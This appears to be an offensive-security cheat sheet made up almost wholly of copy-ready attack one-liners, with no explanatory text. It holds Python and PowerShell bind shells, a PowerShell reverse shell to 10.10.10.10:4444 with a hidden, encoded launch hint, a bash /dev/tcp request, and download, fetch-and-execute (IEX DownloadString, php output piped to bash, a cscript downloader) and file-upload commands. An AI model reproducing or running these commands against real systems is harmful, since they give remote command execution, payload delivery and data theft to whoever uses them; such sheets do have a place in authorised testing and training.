...
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("10.10.10.10",4444));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]4444; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
...
```powershell
# [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("_PAYLOAD_))
# powershell -nop -w hidden -enc "_B46_"
$c=New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()
```
...
```bash
exec 3<>/dev/tcp/10.10.10.10/80 && echo -e "GET /_PATH_ HTTP/1.1\n\n">&3 && cat <&3
```

```powershell
[IO.File]::WriteAllBytes("_PATH_",[Convert]::FromBase64String("_STRING_"))
[Convert]::ToBase64String((Get-Content -path "_PATH_" -Encoding byte))
(New-Object Net.WebClient).DownloadFile("_URL_","_OUTPUT_")
IEX (New-Object Net.WebClient).DownloadString("_URL_")
Invoke-WebRequest "_URL_" -OutFile "_PATH_"
```
...
```bash
php -r '$file = file_get_contents("_URL_");file_put_contents("_PATH_",$file);'
php -r 'const BUFFER = 1024; $fremote = fopen("_URL_", "rb"); $flocal = fopen("_PATH_", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
php -r '$lines = @file("_URL_"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

ruby -e 'require "net/http"; File.write("_PATH_", Net::HTTP.get(URI.parse("_URL_")))'

perl -e 'use LWP::Simple; getstore("_URL_", "_PATH_");'

python3 -c 'import requests;requests.post("_URL_",files={"files":open("_PATH_","rb")})'
```

```js
var WinHttpReq=new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET",WScript.Arguments(0),!1),WinHttpReq.Send(),BinStream=new ActiveXObject("ADODB.Stream"),BinStream.Type=1,BinStream.Open(),BinStream.Write(WinHttpReq.ResponseBody),BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js "_URL_" "_PATH_"
```
